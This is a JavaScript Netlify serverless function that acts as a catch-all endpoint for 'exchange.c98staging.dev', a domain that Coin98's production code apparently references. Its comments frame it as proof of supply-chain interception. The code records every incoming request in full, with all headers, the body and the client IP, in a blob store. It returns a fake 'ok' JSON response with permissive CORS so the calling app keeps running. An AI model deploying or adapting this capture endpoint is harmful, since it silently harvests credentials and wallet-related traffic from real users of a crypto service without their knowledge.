// Catch-all function — records EVERY request that hits exchange.c98staging.dev
// Coin98's production JS references "exchange.c98staging.dev" as a staging exchange API.
// Any traffic from Coin98 apps/extension hitting this domain proves supply chain interception.

import { getStore } from "@netlify/blobs";

export default async (req) => {
    const store = getStore("traffic-log");
    const ts = new Date().toISOString();
    const key = `req_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;

    // Capture full request details
    const url = new URL(req.url);
    let body = '';
    try {
        body = await req.text();
        if (body.length > 10000) body = body.slice(0, 10000) + '... (truncated)';
    } catch (e) {}

    const headers = {};
    req.headers.forEach((v, k) => { headers[k] = v; });

    const entry = {
        timestamp: ts,
        method: req.method,
        path: url.pathname + url.search,
        hostname: url.hostname,
        headers,
        body: body || null,
        sourceIp: headers['x-forwarded-for'] || headers['x-nf-client-connection-ip'] || 'unknown',
        userAgent: headers['user-agent'] || 'unknown',
        origin: headers['origin'] || headers['referer'] || 'none',
    };

    // Store the captured request
    try {
        await store.setJSON(key, entry);
        console.log('[CATCH] Stored:', key, entry.method, entry.path);
    } catch (e) {
        console.error('[CATCH] Failed to store:', e.message, 'hasBlobsCtx:', !!process.env.NETLIFY_BLOBS_CONTEXT);
    }

    // Return a plausible JSON response so Coin98 code doesn't error out
    // This mimics what a staging exchange API might return
    return Response.json({
        status: "ok",
        message: "exchange.c98staging.dev — request recorded",
        timestamp: ts,
        _meta: {
            captured: true,
            path: entry.path,
            method: entry.method,
        }
    }, {
        headers: {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': '*',
        }
    });
};

// Routing handled by [[redirects]] in netlify.toml — no config.path needed
// This avoids conflict between V2 config.path and toml redirects
